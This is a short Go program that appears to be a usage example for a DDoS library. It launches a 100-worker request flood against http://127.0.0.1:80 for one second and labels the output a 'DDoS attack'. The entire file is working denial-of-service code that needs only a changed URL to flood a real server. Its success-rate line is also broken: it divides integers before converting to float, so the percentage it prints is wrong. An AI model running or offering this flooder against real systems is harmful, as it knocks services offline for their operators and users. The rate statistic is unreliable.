package main

import (
  "time"
  "log"
  ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	workers := 100
	d, err := ddos.New("http://127.0.0.1:80", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	log.Println("DDoS attack server: http://127.0.0.1:80")
	// Output: DDoS attack server: http://127.0.0.1:80
  successCnt, amount := d.Result()
  rate := float64(successCnt/amount) * 100
  log.Printf("success %d\tamount %d\trate %.2f%%", successCnt, amount, rate)
}
  
